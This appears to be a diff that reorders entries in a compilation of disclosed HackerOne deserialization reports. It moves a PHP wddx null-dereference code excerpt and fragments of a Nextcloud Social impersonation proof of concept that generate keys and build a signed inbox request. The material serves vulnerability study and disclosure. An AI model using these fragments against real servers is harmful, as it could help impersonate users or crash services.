@@ -153,6 +153,33 @@ http://git.php.net/?p=php-src.git;a=commit;h=426aeb2808955ee3d3f52e0cfb102834cdb
         </data>
 ```
 
+## #161216 wddx_deserialize null dereference — ibb — $500 — Memory Corruption - Generic
+Source: `hackerone/reports/2019/161216.md` (https://hackerone.com/reports/161216)
+
+```
+https://github.com/php/php-src/blob/master/ext/wddx/wddx.c#L896
+
+                if (!strcmp((char *)name, EL_BINARY)) {
+                        zend_string *new_str = php_base64_decode(
+                                (unsigned char *)Z_STRVAL(ent1->data), Z_STRLEN(ent1->data));
+                        zval_ptr_dtor(&ent1->data);
+                        ZVAL_STR(&ent1->data, new_str);
+                }
+```
+
+```
+http://git.php.net/?p=php-src.git;a=commit;h=698a691724c0a949295991e5df091ce16f899e02
+```
+
+```
+                if (!strcmp((char *)name, EL_BINARY)) {
+                        zend_string *new_str = php_base64_decode(
+                                (unsigned char *)Z_STRVAL(ent1->data), Z_STRLEN(ent1->data));
+                        zval_ptr_dtor(&ent1->data);
+                        ZVAL_STR(&ent1->data, new_str);
+                }
+```
+
 ## #73257 PHP yaml_parse/yaml_parse_file/yaml_parse_url Unsafe Deserialization — ibb — $500 — None
 Source: `hackerone/reports/2015/73257.md` (https://hackerone.com/reports/73257)
 
@@ -184,33 +211,6 @@ yaml_parse_url('http://autosectools.com/yaml.txt');
     function __destruct() {
        echo 'destructor invoked';
     }
-```
-
-## #161216 wddx_deserialize null dereference — ibb — $500 — Memory Corruption - Generic
-Source: `hackerone/reports/2019/161216.md` (https://hackerone.com/reports/161216)
-
-```
-https://github.com/php/php-src/blob/master/ext/wddx/wddx.c#L896
-
-                if (!strcmp((char *)name, EL_BINARY)) {
-                        zend_string *new_str = php_base64_decode(
-                                (unsigned char *)Z_STRVAL(ent1->data), Z_STRLEN(ent1->data));
-                        zval_ptr_dtor(&ent1->data);
-                        ZVAL_STR(&ent1->data, new_str);
-                }
-```
-
-```
-http://git.php.net/?p=php-src.git;a=commit;h=698a691724c0a949295991e5df091ce16f899e02
-```
-
-```
-                if (!strcmp((char *)name, EL_BINARY)) {
-                        zend_string *new_str = php_base64_decode(
-                                (unsigned char *)Z_STRVAL(ent1->data), Z_STRLEN(ent1->data));
-                        zval_ptr_dtor(&ent1->data);
-                        ZVAL_STR(&ent1->data, new_str);
-                }
 ```
 
 ## #396954 Attacker can add arbitrary data to the blockchain without paying gas — rootstocklabs — - — Deserialization of Untrusted Data
@@ -458,6 +458,30 @@ Source: `hackerone/reports/2021/921288.md` (https://hackerone.com/reports/921288
     }
 ```
 
+## #461308 Remote attacker can impersonate Social users via ActivityPub API — nextcloud — - — Deserialization of Untrusted Data
+Source: `hackerone/reports/2019/461308.md` (https://hackerone.com/reports/461308)
+
+```
+    // Use same key type and generation code as inside Nextcloud social
+    $res = openssl_pkey_new(
+            [
+                    "digest_alg"       => "rsa",
+                    "private_key_bits" => 2048,
+                    "private_key_type" => OPENSSL_KEYTYPE_RSA,
+            ]
+    );
+```
+
+```
+    openssl_pkey_export($res, $privateKey);
+    $publicKey = openssl_pkey_get_details($res)['key'];
+```
+
+```
+    // Generate a valid request
+    $data = "(request-target): post /nextcloud/index.php/apps/social/inbox";
+```
+
 ## #1702859 Unexpected deserialization in Kredis — rails — - — Deserialization of Untrusted Data
 Source: `hackerone/reports/2023/1702859.md` (https://hackerone.com/reports/1702859)
 
@@ -503,30 +527,6 @@ irb(main):003:0> json.value = abc
 
 irb(main):004:0> json.value
 => "abc"
-```
-
-## #461308 Remote attacker can impersonate Social users via ActivityPub API — nextcloud — - — Deserialization of Untrusted Data
-Source: `hackerone/reports/2019/461308.md` (https://hackerone.com/reports/461308)
-
-```
-    // Use same key type and generation code as inside Nextcloud social
-    $res = openssl_pkey_new(
-            [
-                    "digest_alg"       => "rsa",
-                    "private_key_bits" => 2048,
-                    "private_key_type" => OPENSSL_KEYTYPE_RSA,
-            ]
-    );
-```
-
-```
-    openssl_pkey_export($res, $privateKey);
-    $publicKey = openssl_pkey_get_details($res)['key'];
-```
-
-```
-    // Generate a valid request
-    $data = "(request-target): post /nextcloud/index.php/apps/social/inbox";
 ```
 
 ## #1739099 CVE-2017-5929: Hyperledger - Arbitrary Deserialization of Untrusted Data  — hyperledger — - — None
